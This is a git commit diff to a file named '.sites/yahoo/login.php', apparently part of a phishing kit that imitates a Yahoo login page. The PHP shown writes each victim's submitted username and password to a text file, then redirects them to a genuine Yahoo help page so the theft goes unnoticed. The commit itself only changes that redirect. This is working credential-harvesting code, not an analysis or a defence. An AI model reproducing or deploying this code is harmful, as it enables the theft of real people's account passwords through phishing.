38df7dc7ea044638f7159772b695d08aff6edb58
syafrilanugrah <43766298+syafrilanugrah@users.noreply.github.com>
2022-06-22 14:00:41 +0800

    Update login.php

--- .sites/yahoo/login.php
+++ .sites/yahoo/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Yahoo Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://login.yahoo.com/account/challenge/session-expired');
+header('Location: https://help.yahoo.com/kb/account');
 exit();
 ?>
